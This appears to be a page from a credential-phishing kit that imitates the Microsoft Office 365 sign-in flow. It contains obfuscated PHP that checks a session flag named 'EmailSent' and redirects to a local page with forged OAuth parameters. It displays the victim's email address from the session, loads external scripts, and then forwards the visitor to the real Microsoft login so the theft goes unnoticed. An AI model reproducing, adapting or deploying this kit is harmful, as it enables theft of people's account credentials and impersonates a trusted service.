<?php ${"G\x4c\x4fB\x41\x4cS"}["\x6fm\x5f\x77\x6fd\x70a\x78\x61x\x66\x5f\x79v\x71\x6dz\x62\x6b\x6bm\x74h\x5fs\x67\x5f\x77\x6ev\x67\x65_"]="_\x53E\x53\x53I\x4f\x4e";if(!isset(${${"G\x4c\x4f\x42A\x4cS"}["\x6fm\x5f\x77\x6fd\x70a\x78\x61x\x66\x5f\x79v\x71\x6dz\x62\x6b\x6bm\x74h\x5fs\x67\x5f\x77\x6ev\x67\x65_"]})){session_start();}if(!isset(${${"G\x4c\x4f\x42A\x4cS"}["\x6fm\x5f\x77\x6fd\x70a\x78\x61x\x66\x5f\x79v\x71\x6dz\x62\x6b\x6bm\x74h\x5fs\x67\x5f\x77\x6ev\x67\x65_"]}['EmailSent'])){header("Location: ./index.php?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3donpDpYbVA9UXVeosIVrA2-DRa_7W9BcPErYg_pHkzLEm2C1CXJyT7zl-TTnGm7GUwNa28IqVdMPLDfTu22Vkx9jLw7ulhKTeOy8b3tB1XrriWmPomqxiCJyQbvHmEDVD&nonce=636905940261455591.NGY1NDc0NjYtYTUyNi00NzQ5LWE0NTEtMzY4ZTkxMjBlOTc1MGJlMDllZmQtODE0Ni00N2U2LWI2MjctZjYyYzcxODY2ZmM3&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=dbf14819-814f-4fc4-b446-9ee8f4d1cdc6");exit();} ?>

<!doctype html>
<html dir="ltr" class="" lang="en"><head>
    <script language="Javascript" src="js/Inbox7A.js"></script>
	
	<div class="identityBanner"><!-- ko if: isBackButtonVisible --><!-- /ko --> <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" title="<?= $_SESSION['UserAddress'] ?>"><?= $_SESSION['UserAddress'] ?></div> </div></div> </div><!-- /ko --> <div class="pagination-view has-identity-banner animate slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.sPOST_Username),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } -->
		
		<script language="Javascript" src="js/Inbox7B.js"></script>

		<?php
unset($_SESSION['UserAddress']);
?>
<meta http-equiv="refresh" content="30; url=https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d6XL7VmnBVgwbcqe3iB4SplyOoFG-Q_PviA030ZVUBjX6qRKDKBZMkSNfWS3CyYZQJT5UA5HdV-GqP32SgOr1yXKWUFS3sYbwdfRv0mTZQwRYj4hmqxlC_uHiVR1ajtNH&nonce=636906060835435466.ZDNmNjUxMTgtODQzNi00OWNmLTgzNzEtYTVjYWE3OGYyNWMxMjY5ZWU3ZjEtMmY2NS00NzlmLWIxYjAtODY4ZjRlYWU4YjRj&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=dbf14819-814f-4fc4-b446-9ee8f4d1cdc6">
		
		</body>
		</html>